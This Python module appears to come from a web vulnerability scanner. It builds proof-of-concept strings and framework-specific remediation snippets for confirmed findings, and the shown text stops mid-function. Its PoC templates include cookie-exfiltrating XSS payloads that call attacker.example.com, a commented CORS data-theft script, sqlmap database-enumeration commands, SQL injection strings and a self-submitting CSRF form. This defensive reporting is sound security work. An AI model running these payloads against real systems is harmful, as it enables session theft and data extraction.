# agents/webappscanner/action_agent.py
"""
ActionAgent
===========
Third agent in the 3-agent verification loop:

  VulnerabilityTester  → detects  ("this endpoint reflects XSS")
  AttackVerificationAgent → confirms ("payload executes, HTTP 200")
  ActionAgent          → acts    ("here is the PoC + exact fix code")

The ActionAgent takes every CONFIRMED finding and produces two things:

  1. attack_poc  — a ready-to-run artifact proving the vulnerability is real
                   (curl command, HTML page, HTTP request, sqlmap command)

  2. fix_snippet — the exact code/config change to remediate it,
                   tailored to the detected technology stack

These are embedded directly into the report as Section 3b.

DESIGN PRINCIPLES
=================
- No actual exploitation. PoCs demonstrate the vulnerability exists,
  they do not exfiltrate data or modify the target.
- Stack-aware fixes. A missing CSP header gets a different fix for
  SvelteKit vs Django vs nginx — inferred from the detected stack.
- Pure Python code generation. No LLM calls for PoC generation —
  PoCs are built by code from finding metadata. LLM is only called
  for fix snippets when the stack requires framework-specific guidance.
- Fast. Each finding processed in < 100ms (no network calls).
"""

import re
import json
import logging
import textwrap
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Stack-aware fix templates
# ---------------------------------------------------------------------------

# Maps (vuln_type_pattern, stack_keyword) → fix config block
# Used to generate stack-specific fixes instead of generic advice

_HEADER_FIXES = {
    # ── Nginx ──────────────────────────────────────────────────────────
    "nginx": {
        "X-Frame-Options": 'add_header X-Frame-Options "DENY" always;',
        "X-Content-Type-Options": 'add_header X-Content-Type-Options "nosniff" always;',
        "Content-Security-Policy": "add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';\" always;",
        "Strict-Transport-Security": 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
        "X-XSS-Protection": 'add_header X-XSS-Protection "1; mode=block" always;',
        "Referrer-Policy": 'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
        "Permissions-Policy": 'add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;',
    },
    # ── Apache ─────────────────────────────────────────────────────────
    "apache": {
        "X-Frame-Options": 'Header always set X-Frame-Options "DENY"',
        "X-Content-Type-Options": 'Header always set X-Content-Type-Options "nosniff"',
        "Content-Security-Policy": "Header always set Content-Security-Policy \"default-src 'self';\"",
        "Strict-Transport-Security": 'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"',
        "X-XSS-Protection": 'Header always set X-XSS-Protection "1; mode=block"',
        "Referrer-Policy": 'Header always set Referrer-Policy "strict-origin-when-cross-origin"',
        "Permissions-Policy": 'Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"',
    },
    # ── SvelteKit ──────────────────────────────────────────────────────
    "sveltekit": {
        "X-Frame-Options": """// svelte.config.js
export default {
  kit: {
    headers: {
      'X-Frame-Options': 'DENY'
    }
  }
};""",
        "X-Content-Type-Options": """// svelte.config.js
export default {
  kit: {
    headers: { 'X-Content-Type-Options': 'nosniff' }
  }
};""",
        "Content-Security-Policy": """// svelte.config.js — hooks.server.js approach
export async function handle({ event, resolve }) {
  const response = await resolve(event);
  response.headers.set('Content-Security-Policy',
    "default-src 'self'; script-src 'self';");
  return response;
}""",
        "Strict-Transport-Security": """// hooks.server.js
response.headers.set('Strict-Transport-Security',
  'max-age=31536000; includeSubDomains');""",
        "X-XSS-Protection": """// hooks.server.js
response.headers.set('X-XSS-Protection', '1; mode=block');""",
        "Referrer-Policy": """// hooks.server.js
response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');""",
        "Permissions-Policy": """// hooks.server.js
response.headers.set('Permissions-Policy',
  'geolocation=(), microphone=(), camera=()');""",
    },
    # ── Next.js ────────────────────────────────────────────────────────
    "next.js": {
        "X-Frame-Options": """// next.config.js
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'X-Frame-Options', value: 'DENY' }]
  }]
};""",
        "Content-Security-Policy": """// next.config.js
const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-eval';";
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'Content-Security-Policy', value: cspHeader }]
  }]
};""",
        "Strict-Transport-Security": """// next.config.js — add to headers array
{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }""",
        "Referrer-Policy": """// next.config.js
{ key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }""",
        "Permissions-Policy": """// next.config.js
{ key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' }""",
    },
    # ── Express / Node.js (Helmet) ─────────────────────────────────────
    "express": {
        "X-Frame-Options": """// app.js — use helmet
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));""",
        "Content-Security-Policy": """// app.js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
  }
}));""",
        "Strict-Transport-Security": """// app.js
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));""",
        "Referrer-Policy": """// app.js
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));""",
        "Permissions-Policy": """// app.js — manual header
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});""",
    },
    # ── Django ─────────────────────────────────────────────────────────
    "django": {
        "X-Frame-Options": """# settings.py
X_FRAME_OPTIONS = 'DENY'""",
        "Content-Security-Policy": """# settings.py — install django-csp
MIDDLEWARE = ['csp.middleware.CSPMiddleware', ...]
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)""",
        "Strict-Transport-Security": """# settings.py
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True""",
        "Referrer-Policy": """# settings.py
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'""",
        "Permissions-Policy": """# settings.py — custom middleware
class PermissionsPolicyMiddleware:
    def __call__(self, request):
        response = self.get_response(request)
        response['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
        return response""",
    },
    # ── FastAPI / Python ────────────────────────────────────────────────
    "fastapi": {
        "X-Frame-Options": """# main.py
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers['X-Frame-Options'] = 'DENY'
        return response

app.add_middleware(SecurityHeadersMiddleware)""",
        "Content-Security-Policy": """# main.py — add to SecurityHeadersMiddleware
response.headers['Content-Security-Policy'] = "default-src 'self';" """,
        "Strict-Transport-Security": """# main.py
response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'""",
    },
    # ── Generic (fallback) ─────────────────────────────────────────────
    "generic": {
        "X-Frame-Options": 'X-Frame-Options: DENY',
        "X-Content-Type-Options": 'X-Content-Type-Options: nosniff',
        "Content-Security-Policy": "Content-Security-Policy: default-src 'self';",
        "Strict-Transport-Security": 'Strict-Transport-Security: max-age=31536000; includeSubDomains',
        "X-XSS-Protection": 'X-XSS-Protection: 1; mode=block',
        "Referrer-Policy": 'Referrer-Policy: strict-origin-when-cross-origin',
        "Permissions-Policy": 'Permissions-Policy: geolocation=(), microphone=(), camera=()',
    },
}

# Effort estimates in minutes per fix type
_EFFORT_MINUTES = {
    "Missing Security Header":    2,
    "Clickjacking":               2,
    "CORS Misconfiguration":      10,
    "Information Disclosure":     5,
    "Missing CSRF Protection":    30,
    "Reflected XSS":              60,
    "Stored XSS":                 120,
    "SQL Injection":              120,
    "Open Redirect":              15,
    "Sensitive File Exposed":     5,
    "default":                    30,
}


class ActionAgent:
    """
    Produces PoC artifacts and stack-specific fix snippets
    for every confirmed vulnerability.

    No network calls. No LLM calls.
    Pure code generation from finding metadata + detected stack.
    """

    def process_all(self, findings: List[Dict],
                    target_url: str,
                    stack: Dict,
                    verbose: bool = False) -> List[Dict]:
        """
        Process all confirmed findings and return action results.

        Parameters
        ----------
        findings   : all_findings from web_scanner_agent
        target_url : base URL of target
        stack      : detected tech stack dict

        Returns
        -------
        List of action dicts, one per confirmed finding:
        {
            "finding_type":  str,
            "severity":      str,
            "location":      str,
            "attack_poc":    str,   # ready-to-run PoC artifact
            "poc_type":      str,   # "curl" | "html" | "http_request" | "command" | "none"
            "fix_snippet":   str,   # exact code/config to fix it
            "fix_language":  str,   # language hint for syntax highlighting
            "effort_minutes": int,  # estimated fix effort
            "fix_context":   str,   # which file/config to edit
        }
        """
        if verbose:
            print(f"\n  Action Agent — generating PoCs and fix snippets")

        # Only act on confirmed findings
        confirmed = [f for f in findings if f.get("status") == "Confirmed"]

        # Infer stack keywords for fix template selection
        stack_keywords = self._infer_stack_keywords(stack)
        if verbose:
            print(f"   Stack keywords: {stack_keywords}")

        actions = []
        for finding in confirmed:
            try:
                action = self._process_finding(
                    finding, target_url, stack_keywords
                )
                if action:
                    actions.append(action)
            except Exception as e:
                logger.debug(f"Action generation failed for "
                             f"{finding.get('type','?')}: {e}")

        if verbose:
            print(f"   ✓ Generated {len(actions)} action items "
                  f"({len(confirmed)} confirmed findings)")

        return actions

    # ------------------------------------------------------------------
    # Stack keyword inference
    # ------------------------------------------------------------------

    def _infer_stack_keywords(self, stack: Dict) -> List[str]:
        """Extract lowercase technology keywords from stack dict."""
        keywords = []
        techs = stack.get("technologies", [])
        summary = stack.get("stack_summary", "")

        for t in (techs + [summary]):
            if isinstance(t, str):
                kw = t.lower().split("/")[0].strip()
                if kw:
                    keywords.append(kw)

        # Normalize common aliases
        aliases = {
            "node.js": "express",
            "nodejs":  "express",
            "svelte":  "sveltekit",
        }
        normalized = []
        for kw in keywords:
            normalized.append(aliases.get(kw, kw))

        return list(dict.fromkeys(normalized))

    def _best_stack_for_header(self, stack_keywords: List[str]) -> str:
        """Pick the most specific stack key that has header fix templates."""
        priority = ["sveltekit", "next.js", "express", "django",
                    "fastapi", "nginx", "apache"]
        for fw in priority:
            if fw in stack_keywords:
                return fw
        return "generic"

    # ------------------------------------------------------------------
    # Main finding processor
    # ------------------------------------------------------------------

    def _process_finding(self, finding: Dict,
                          target_url: str,
                          stack_keywords: List[str]) -> Optional[Dict]:
        """Route finding to the appropriate PoC + fix generator."""
        vuln_type = finding.get("type", "")
        severity  = finding.get("severity", "Low")
        location  = finding.get("location", target_url)
        parameter = finding.get("parameter", "")
        evidence  = finding.get("evidence", {})

        # Route by vulnerability type
        if "Missing Security Header" in vuln_type:
            return self._action_missing_header(
                vuln_type, severity, location, stack_keywords
            )
        elif "Clickjacking" in vuln_type:
            return self._action_clickjacking(location, stack_keywords)
        elif "CORS" in vuln_type:
            return self._action_cors(location, stack_keywords)
        elif "Information Disclosure" in vuln_type and "header" in vuln_type.lower():
            return self._action_info_disclosure_header(
                vuln_type, location, stack_keywords
            )
        elif "XSS" in vuln_type or "Cross-Site Scripting" in vuln_type:
            return self._action_xss(
                vuln_type, location, parameter, evidence, stack_keywords
            )
        elif "SQL Injection" in vuln_type:
            return self._action_sqli(
                vuln_type, location, parameter, evidence, stack_keywords
            )
        elif "Open Redirect" in vuln_type:
            return self._action_open_redirect(location, parameter)
        elif "CSRF" in vuln_type:
            return self._action_csrf(location, stack_keywords)
        elif "Sensitive File" in vuln_type:
            return self._action_sensitive_file(vuln_type, location, stack_keywords)
        else:
            return self._action_generic(vuln_type, severity, location)

    # ------------------------------------------------------------------
    # PoC + Fix generators per vulnerability type
    # ------------------------------------------------------------------

    def _action_missing_header(self, vuln_type: str, severity: str,
                                location: str,
                                stack_keywords: List[str]) -> Dict:
        # Extract the header name from the vuln type string
        # e.g. "Missing Security Header: Content-Security-Policy"
        header = vuln_type.replace("Missing Security Header:", "").strip()
        stack_key = self._best_stack_for_header(stack_keywords)

        # Detection PoC is always a curl command — simple and consistent
        # Exploit context is appended as a comment so the entire PoC
        # stays in one bash code block with correct syntax highlighting.
        header_lower = header.lower()

        if header_lower == "content-security-policy":
            poc = (
                f'curl -I {location} | grep -i "{header}"\n'
                f'# Expected: no output (header absent)\n\n'
                f'# Impact: Without CSP, attacker can inject inline scripts:\n'
                f'# <script>fetch("https://attacker.com/?c="+document.cookie)</script>'
            )
        elif header_lower == "x-frame-options":
            poc = (
                f'curl -I {location} | grep -i "{header}"\n'
                f'# Expected: no output (header absent)\n\n'
                f'# Impact: Site can be embedded in an iframe — enables clickjacking.\n'
                f'# See Clickjacking finding for a full HTML PoC.'
            )
        elif header_lower == "strict-transport-security":
            poc = (
                f'curl -I {location} | grep -i "{header}"\n'
                f'# Expected: no output (header absent)\n\n'
                f'# Impact: Without HSTS, attacker on local network can downgrade\n'
                f'# HTTPS to HTTP and intercept traffic (SSL stripping).'
            )
        elif header_lower == "referrer-policy":
            poc = (
                f'curl -I {location} | grep -i "{header}"\n'
                f'# Expected: no output (header absent)\n\n'
                f'# Impact: Browser sends full URL in Referer header to third parties.\n'
                f'# Tokens or session IDs in URLs may leak to analytics/ad scripts.'
            )
        else:
            poc = (
                f'curl -I {location} | grep -i "{header}"\n'
                f'# Expected: no output (header absent)'
            )
        poc_type = "curl"

        fix_templates = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"])
        fix_snippet = fix_templates.get(header, f'{header}: <value>')

        fix_language = self._fix_language(stack_key)
        fix_context  = self._fix_context(stack_key, header)

        return {
            "finding_type":    vuln_type,
            "severity":        severity,
            "location":        location,
            "attack_poc":      poc,
            "poc_type":        poc_type,
            "fix_snippet":     fix_snippet,
            "fix_language":    fix_language,
            "fix_context":     fix_context,
            "effort_minutes":  _EFFORT_MINUTES["Missing Security Header"],
        }

    def _action_clickjacking(self, location: str,
                              stack_keywords: List[str]) -> Dict:
        # PoC: minimal HTML page that embeds the target in an iframe
        poc = textwrap.dedent(f"""\
            <!DOCTYPE html>
            <html>
            <head><title>Clickjacking PoC</title></head>
            <body>
              <h1>Clickjacking Demonstration</h1>
              <p>The target site loads inside this iframe — proving framing is possible.</p>
              <div style="position:relative;width:800px;height:600px;">
                <!-- Transparent overlay to intercept clicks -->
                <div style="position:absolute;top:0;left:0;width:100%;height:100%;
                            background:rgba(255,0,0,0.15);z-index:10;cursor:pointer;"
                     onclick="alert('Click intercepted!')">
                </div>
                <iframe src="{location}" width="800" height="600"
                        style="border:2px solid red;"></iframe>
              </div>
              <p><strong>Impact:</strong> Attacker can overlay invisible UI elements
              and trick users into performing unintended actions (account changes,
              data submission, payments).</p>
            </body>
            </html>""")

        stack_key = self._best_stack_for_header(stack_keywords)
        x_frame_fix = _HEADER_FIXES.get(
            stack_key, _HEADER_FIXES["generic"]
        ).get("X-Frame-Options", 'X-Frame-Options: DENY')

        fix_snippet = x_frame_fix
        # Also suggest CSP frame-ancestors
        csp_fix = "Content-Security-Policy: frame-ancestors 'none';"
        fix_snippet = f"{fix_snippet}\n# OR use CSP (stronger, preferred):\n{csp_fix}"

        return {
            "finding_type":   "Clickjacking",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "fix_snippet":    fix_snippet,
            "fix_language":   self._fix_language(stack_key),
            "fix_context":    self._fix_context(stack_key, "X-Frame-Options"),
            "effort_minutes": _EFFORT_MINUTES["Clickjacking"],
        }

    def _action_cors(self, location: str,
                     stack_keywords: List[str]) -> Dict:
        poc = textwrap.dedent(f"""\
            # PoC 1: Verify CORS misconfiguration with curl
            curl -s -I -H "Origin: https://evil-attacker.example.com" \\
              {location} | grep -i "access-control"
            # Expected output: Access-Control-Allow-Origin: https://evil-attacker.example.com

            # PoC 2: Browser-based cross-origin data theft
            # Save as cors_poc.html and open in browser:
            # <script>
            # fetch('{location}/api/user', {{
            #   credentials: 'include'
            # }}).then(r => r.text()).then(data => {{
            #   // Exfiltrate to attacker server
            #   fetch('https://attacker.example.com/steal?data=' + btoa(data));
            # }});
            # </script>""")

        stack_key = self._best_stack_for_header(stack_keywords)

        if "nginx" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # nginx.conf — replace wildcard CORS with allowlist
                # Remove: add_header Access-Control-Allow-Origin "*";
                # Add:
                map $http_origin $cors_origin {
                    default "";
                    "https://your-trusted-domain.com" "$http_origin";
                }
                add_header Access-Control-Allow-Origin $cors_origin always;
                add_header Vary Origin always;""")
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // app.js — replace permissive CORS with allowlist
                const cors = require('cors');
                const allowedOrigins = [
                  'https://your-trusted-domain.com',
                  'https://app.your-domain.com',
                ];
                app.use(cors({
                  origin: (origin, callback) => {
                    if (!origin || allowedOrigins.includes(origin)) {
                      callback(null, true);
                    } else {
                      callback(new Error('Not allowed by CORS'));
                    }
                  },
                  credentials: true,
                }));""")
            fix_language = "javascript"
            fix_context  = "app.js / server entry point"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # settings.py — install django-cors-headers
                # pip install django-cors-headers
                INSTALLED_APPS = ['corsheaders', ...]
                MIDDLEWARE = ['corsheaders.middleware.CorsMiddleware', ...]
                # Replace CORS_ALLOW_ALL_ORIGINS = True with:
                CORS_ALLOWED_ORIGINS = [
                    'https://your-trusted-domain.com',
                ]
                CORS_ALLOW_CREDENTIALS = True""")
            fix_language = "python"
            fix_context  = "settings.py"
        else:
            fix_snippet = textwrap.dedent("""\
                # Replace wildcard CORS header:
                # Access-Control-Allow-Origin: *    ← REMOVE THIS
                # With explicit allowlist:
                # Access-Control-Allow-Origin: https://your-trusted-domain.com
                # Access-Control-Vary: Origin
                # Never combine wildcard (*) with Allow-Credentials: true""")
            fix_language = "text"
            fix_context  = "Web server / application CORS configuration"

        return {
            "finding_type":   "CORS Misconfiguration",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["CORS Misconfiguration"],
        }

    def _action_info_disclosure_header(self, vuln_type: str, location: str,
                                        stack_keywords: List[str]) -> Dict:
        header = "Server"
        if "x-powered-by" in vuln_type.lower():
            header = "X-Powered-By"

        poc = (f'curl -I {location} | grep -i "{header}"\n'
               f'# Shows: {header}: <version info>')

        if "nginx" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # nginx.conf
                server_tokens off;
                # Also add to http block:
                more_clear_headers Server;  # requires headers_more module""")
            fix_language = "nginx"
            fix_context  = "nginx.conf"
        elif "apache" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # httpd.conf or .htaccess
                ServerTokens Prod
                ServerSignature Off
                Header unset X-Powered-By""")
            fix_language = "apache"
            fix_context  = "httpd.conf"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // app.js — helmet removes X-Powered-By by default
                const helmet = require('helmet');
                app.use(helmet());
                // Or manually:
                app.disable('x-powered-by');""")
            fix_language = "javascript"
            fix_context  = "app.js"
        else:
            fix_snippet = (f"Remove or obscure the {header} response header "
                           f"in your web server configuration.")
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
            "severity":       "Low",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Information Disclosure"],
        }

    def _action_xss(self, vuln_type: str, location: str,
                    parameter: str, evidence: Dict,
                    stack_keywords: List[str]) -> Dict:
        method = evidence.get("confirmation_method", "http_body")

        if parameter:
            if method == "js_execution":
                poc = (f'# XSS confirmed — JavaScript executed (alert dialog)\n'
                       f'# Submit to form at: {location}\n'
                       f'# Parameter: {parameter}\n'
                       f'# Payload: "><script>alert(document.cookie)</script>')
            elif method == "dom_reflection":
                poc = (f'# XSS confirmed in rendered DOM\n'
                       f'# Submit to form at: {location}\n'
                       f'# Parameter: {parameter}\n'
                       f'# Payload: "><img src=x onerror="fetch(\'https://attacker.example.com/?\'+document.cookie)">')
            else:
                poc = (f'# XSS confirmed — payload reflected in HTTP response\n'
                       f'curl -X POST "{location}" \\\n'
                       f'  -d \'{parameter}="><script>alert(1)</script>&other=value\'\n'
                       f'# grep response for reflected payload')
        else:
            poc = (f'# XSS — manual verification required\n'
                   f'# Location: {location}\n'
                   f'# Test: "><script>alert(1)</script>')

        if "react" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // React — never use dangerouslySetInnerHTML with user input
                // BAD:
                <div dangerouslySetInnerHTML={{ __html: userInput }} />
                // GOOD — React escapes by default:
                <div>{userInput}</div>
                // If HTML is needed, sanitize first:
                import DOMPurify from 'dompurify';
                <div dangerouslySetInnerHTML={{
                  __html: DOMPurify.sanitize(userInput)
                }} />""")
            fix_language = "jsx"
            fix_context  = "Component rendering user input"
        elif "angular" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // Angular — use built-in sanitization
                // BAD:
                <div [innerHTML]="userInput"></div>
                // GOOD — Angular's DomSanitizer:
                import { DomSanitizer } from '@angular/platform-browser';
                constructor(private sanitizer: DomSanitizer) {}
                safe = this.sanitizer.sanitize(SecurityContext.HTML, userInput);
                // Or use textContent for plain text:
                <div>{{ userInput }}</div>  <!-- auto-escaped -->""")
            fix_language = "typescript"
            fix_context  = "Angular component template"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # Django templates auto-escape by default
                # BAD — disables escaping:
                {{ user_input | safe }}
                # GOOD — use default escaping:
                {{ user_input }}
                # For views returning HTML:
                from django.utils.html import escape
                safe_value = escape(user_input)""")
            fix_language = "python"
            fix_context  = "Django template / view"
        else:
            fix_snippet = textwrap.dedent("""\
                // Apply HTML output encoding to all user-controlled data
                // before rendering in HTML context
                function escapeHtml(str) {
                  return str
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;')
                    .replace(/'/g, '&#039;');
                }
                // Also implement Content-Security-Policy to contain impact""")
            fix_language = "javascript"
            fix_context  = "Server-side output encoding"

        return {
            "finding_type":   vuln_type,
            "severity":       "High",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Reflected XSS"],
        }

    def _action_sqli(self, vuln_type: str, location: str,
                     parameter: str, evidence: Dict,
                     stack_keywords: List[str]) -> Dict:
        method = evidence.get("confirmation_method", "pattern")

        if method == "timing":
            poc = textwrap.dedent(f"""\
                # Time-based blind SQL injection confirmed
                # Endpoint: {location}
                # sqlmap command (automated exploitation):
                sqlmap -u "{location}" \\
                  --data="{parameter}=test" \\
                  --technique=T \\
                  --level=3 \\
                  --risk=2 \\
                  --batch \\
                  --dbs

                # Manual verification:
                curl -X POST "{location}" \\
                  -d "{parameter}=' AND SLEEP(5)--"
                # Response time > 5s confirms vulnerability""")
        else:
            poc = textwrap.dedent(f"""\
                # SQL error-based injection confirmed
                # Endpoint: {location}
                # sqlmap command:
                sqlmap -u "{location}" \\
                  --data="{parameter}=test" \\
                  --technique=E \\
                  --batch \\
                  --dbs

                # Manual test that triggered the error:
                curl -X POST "{location}" \\
                  -d "{parameter}=' OR '1'='1"
                # Response contained SQL error message""")

        if "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # Django ORM uses parameterised queries by default — safe:
                User.objects.filter(username=username)

                # NEVER use raw() with string interpolation:
                # BAD:  User.objects.raw(f"SELECT * FROM users WHERE name='{name}'")
                # GOOD: User.objects.raw("SELECT * FROM users WHERE name=%s", [name])

                # For truly custom SQL:
                from django.db import connection
                with connection.cursor() as cursor:
                    cursor.execute("SELECT * FROM t WHERE id = %s", [user_id])""")
            fix_language = "python"
            fix_context  = "Django ORM query"
        elif "php" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // PHP — use PDO prepared statements
                // BAD:
                $query = "SELECT * FROM users WHERE name = '$name'";

                // GOOD:
                $stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
                $stmt->execute([$name]);
                $user = $stmt->fetch();""")
            fix_language = "php"
            fix_context  = "Database query code"
        elif "node" in stack_keywords or "express" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // Node.js — use parameterised queries
                // BAD (mysql2):
                connection.query(`SELECT * FROM users WHERE id = ${userId}`);

                // GOOD:
                connection.query('SELECT * FROM users WHERE id = ?', [userId]);

                // Or use an ORM (Prisma, Sequelize) which parameterises by default""")
            fix_language = "javascript"
            fix_context  = "Database query"
        else:
            fix_snippet = textwrap.dedent("""\
                -- Use parameterised queries / prepared statements.
                -- NEVER interpolate user input into SQL strings.
                -- Example (generic):
                PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';
                SET @id = :user_input;
                EXECUTE stmt USING @id;""")
            fix_language = "sql"
            fix_context  = "Database query layer"

        return {
            "finding_type":   vuln_type,
            "severity":       "Critical",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["SQL Injection"],
        }

    def _action_open_redirect(self, location: str,
                               parameter: str) -> Dict:
        poc = (f'# Open redirect confirmed\n'
               f'curl -I "{location}?{parameter}=https://evil-attacker.example.com"\n'
               f'# Check Location header in response — should point to attacker domain\n\n'
               f'# Phishing URL that would be sent to victims:\n'
               f'# {location}?{parameter}=https://evil-attacker.example.com/fake-login')

        fix_snippet = textwrap.dedent("""\
            // Validate redirect URLs against an allowlist
            // NEVER redirect to a URL directly from user input

            const ALLOWED_REDIRECT_HOSTS = [
              'your-domain.com',
              'app.your-domain.com',
            ];

            function safeRedirect(url, res) {
              try {
                const parsed = new URL(url);
                if (ALLOWED_REDIRECT_HOSTS.includes(parsed.hostname)) {
                  return res.redirect(url);
                }
              } catch (e) { /* invalid URL */ }
              // Default: redirect to home page
              return res.redirect('/');
            }""")

        return {
            "finding_type":   "Open Redirect",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   "javascript",
            "fix_context":    "Redirect handler",
            "effort_minutes": _EFFORT_MINUTES["Open Redirect"],
        }

    def _action_csrf(self, location: str,
                     stack_keywords: List[str]) -> Dict:
        poc = textwrap.dedent(f"""\
            <!-- CSRF PoC — save as csrf_poc.html, open from different origin -->
            <!-- Silently submits the form on behalf of an authenticated user -->
            <!DOCTYPE html>
            <html>
            <body onload="document.csrf_form.submit()">
              <form name="csrf_form" action="{location}" method="POST">
                <input type="hidden" name="action" value="attacker_controlled">
                <input type="hidden" name="data"   value="malicious_value">
              </form>
              <p>Submitting silently...</p>
            </body>
            </html>""")

        if "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # Django has built-in CSRF protection — ensure it's enabled
                # settings.py:
                MIDDLEWARE = [
                    'django.middleware.csrf.CsrfViewMiddleware',  # must be present
                    ...
                ]
                # In templates, add to every POST form:
                <form method="post">
                    {% csrf_token %}
                    ...
                </form>""")
            fix_language = "python"
            fix_context  = "settings.py + templates"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // Express — use csurf middleware
                const csrf = require('csurf');
                const csrfProtection = csrf({ cookie: true });

                app.get('/form', csrfProtection, (req, res) => {
                  res.render('form', { csrfToken: req.csrfToken() });
                });

                app.post('/form', csrfProtection, (req, res) => {
                  // CSRF token validated automatically
                });

                // In your HTML form:
                // <input type="hidden" name="_csrf" value="<%= csrfToken %>">""")
            fix_language = "javascript"
            fix_context  = "app.js + form template"
        elif "sveltekit" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                // SvelteKit — use built-in CSRF protection (enabled by default in 1.x+)
                // svelte.config.js:
                export default {
                  kit: {
                    csrf: {
                      checkOrigin: true,  // blocks cross-origin POST (default: true)
                    }
                  }
                };
                // Also use SvelteKit form actions — they handle CSRF automatically""")
            fix_language = "javascript"
            fix_context  = "svelte.config.js"
        else:
            fix_snippet = textwrap.dedent("""\
                // Implement Synchronizer Token Pattern:
                // 1. Generate a random token per session on the server
                const csrfToken = crypto.randomBytes(32).toString('hex');
                session.csrfToken = csrfToken;

                // 2. Embed in every POST form as hidden field
                <input type="hidden" name="csrf_token" value="${csrfToken}">

                // 3. Validate on every POST request
                if (req.body.csrf_token !== req.session.csrfToken) {
                  return res.status(403).send('CSRF validation failed');
                }""")
            fix_language = "javascript"
            fix_context  = "Session / form handling"

        return {
            "finding_type":   "Missing CSRF Protection",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Missing CSRF Protection"],
        }

    def _action_sensitive_file(self, vuln_type: str, location: str,
                                stack_keywords: List[str]) -> Dict:
        # Extract path from vuln_type or location
        path = ""
        m = re.search(r"(\/\S+)", vuln_type)
        if m:
            path = m.group(1)
        else:
            from urllib.parse import urlparse
            path = urlparse(location).path

        poc = (f'curl -s "{location}"\n'
               f'# Returns HTTP 200 with file contents\n'
               f'# Sensitive data exposed at: {location}')

        if "nginx" in stack_keywords:
            fix_snippet = textwrap.dedent(f"""\
                # nginx.conf — block access to sensitive file
                location ~* {re.escape(path)} {{
                    deny all;
                    return 404;
                }}
                # Or remove the file entirely from the server:
                # rm /var/www/html{path}""")
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "apache" in stack_keywords:
            fix_snippet = textwrap.dedent(f"""\
                # .htaccess — block access
